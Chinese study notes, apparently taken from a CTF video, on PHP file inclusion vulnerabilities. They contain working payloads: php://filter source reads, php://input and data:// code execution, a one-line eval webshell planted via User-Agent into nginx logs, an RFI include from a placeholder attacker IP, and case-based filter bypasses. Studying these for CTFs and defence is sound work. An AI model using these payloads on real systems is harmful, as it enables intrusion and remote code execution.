学习笔记-文件包含入门

这是一份根据您提供的视频《[CTF知识树-WEB] 文件包含入门》整理的 Markdown 格式学习笔记。

文件包含漏洞入门

1. 漏洞简介

文件包含漏洞（File Inclusion） 与 SQL 注入类似，本质上是一种注入型漏洞。它的产生是因为程序没有对用户可控的输入进行严格过滤，导致攻击者可以控制包含的脚本或代码，并让服务器端去执行。

在 PHP 开发中，为了避免重复编写代码，通常会把多次使用的函数写在一个单一的文件中。当需要使用这些函数时，会直接调用包含函数的文件，这个过程就叫“包含”。

PHP 常见文件包含函数

  • include()：找不到被包含的文件时只会产生警告（Warning），脚本继续执行。
  • require()：找不到被包含的文件时会产生致命错误（Fatal Error），并停止脚本运行。
  • include_once()：与 include() 类似，但如果该文件已经被包含过，则不会再次包含。
  • require_once()：与 require() 类似，但如果该文件已经被包含过，则不会再次包含。

2. 漏洞分类与前置条件

文件包含漏洞主要分为两类：本地文件包含 (LFI) 和 远程文件包含 (RFI)。这两者的区分主要取决于 PHP 环境的配置。

在 php.ini 配置文件中：

  • 本地文件包含 (Local File Include, LFI)：无论配置如何，只要本地存在该文件即可包含。
  • 远程文件包含 (Remote File Include, RFI)：需要开启特定的配置项。
  • allow_url_fopen = On （默认开启）
  • allow_url_include = On （PHP 5.2 之后默认关闭，必须开启此项才能进行 RFI）

3. 本地文件包含 (LFI) 常见利用方式

3.1 直接包含文件

直接传入目标文件的绝对或相对路径进行包含。常用于包含图片木马。

  • 同目录下：?file=test.txt
  • 使用目录遍历：?file=../../test.txt

3.2 日志包含 (Log Inclusion)

因为 include 等函数在包含文件时，如果文件内含有 PHP 语句（<?php ... ?>），就会执行该语句；如果是非 PHP 语句，则会直接原样打印输出。

  • 原理：利用服务器的访问日志（Access Log）等。
  • 前提：知道服务器日志的存储路径，且该日志文件对 Web 用户可读。
  • 操作：在发起 HTTP 请求时，将恶意 PHP 代码（如一句话木马 <?php @eval($_REQUEST[1]);?>）写入 User-Agent (UA) 等字段。服务器会将其记录到日志中。随后包含该日志文件，其中的恶意代码就会被执行。

3.3 包含临时文件（条件竞争）

  • 原理：向 PHP 上传文件时，系统会默认在临时目录（Linux: /tmp, Windows: C:\windows\temp）下创建一个临时文件。虽然 PHP 在请求结束后会立即删除该临时文件，但攻击者可以利用条件竞争（Race Condition），在文件被删除的瞬间抢先包含并执行它。

4. 远程文件包含 (RFI) 与 PHP 伪协议

4.1 远程文件包含

直接包含攻击者搭建的远程服务器上的恶意文件。支持的协议包括 http://、https://、ftp:// 等。

  • 示例：?file=http://[黑客IP]/1.txt （1.txt 内容为恶意 PHP 代码）

4.2 强大的 PHP 伪协议 (PHP Wrappers)

PHP 提供了一系列强大的伪协议，在 CTF 题目中极为常用：

  • file://：访问本地文件系统。
  • http:// / https://：访问 HTTP(s) 网址。
  • php://：访问各个输入/输出流 (I/O streams)。（最常用）
  • zlib://：压缩流。
  • data://：数据流（直接传递数据）。

5. 实战 Payload 总结 (CTF 常见套路)

套路一：利用 php://filter 读取源码

如果在题目中直接 ?file=flag.php，通常页面只会是一片空白。因为 flag.php 被包含后，其内部的 PHP 代码会被执行，而不是显示出来。

  • Payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php
  • 原理解析：利用 filter 读取 flag.php 的内容，并强制对其进行 base64 编码。由于编码后的字符串不再是合法的 PHP 标签，服务器就不会去执行它，而是直接把 base64 密文输出在页面上。拿到密文后解码即可得到 Flag。

套路二：利用 php://input 执行代码

php://input 可以访问请求的原始数据的只读流。它会将 POST 请求的数据作为 PHP 代码执行。

  • GET 请求: ?file=php://input
  • POST 数据: <?php system("tac flag.php"); ?>
  • 注意：遇到 enctype="multipart/form-data" 时该伪协议无效。

套路三：利用 data:// 执行代码

将原本需要外部包含的文件内容直接硬编码在 URL 中传递。

  • 明文 Payload: ?file=data://text/plain,<?php system('tac flag.php');?>
  • Base64 编码 Payload (用于绕过特殊字符拦截): ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==

套路四：过滤关键字绕过 (大小写绕过)

如果后端代码使用了 str_replace 过滤了 php、data 等关键字（例如 str_replace('php', '???', $file)）。

  • 绕过方法：PHP 伪协议中的协议名称是不区分大小写的。
  • Payload: 使用大写混合绕过，如 ?file=Php://input 或 ?file=PHP://filter...。

套路五：Nginx 日志包含实战

当其它伪协议都被过滤时，考虑日志包含。

  1. 抓包，修改 User-Agent 为一句话木马：<?php @eval($_REQUEST[1]);?>，发送请求使木马被写入 Nginx 日志。
  2. 包含 Nginx 日志：?file=/var/log/nginx/access.log
  3. 通过 POST 发送命令执行参数：1=system('tac flag.php');

💡 结语：文件包含漏洞的核心在于寻找一切能够将不可执行文件（如 txt、图片、日志、编码流）转换为可执行代码的途径。熟练掌握 php://filter 编码读取和 php://input / data:// 代码注入是解决此类题目的关键。
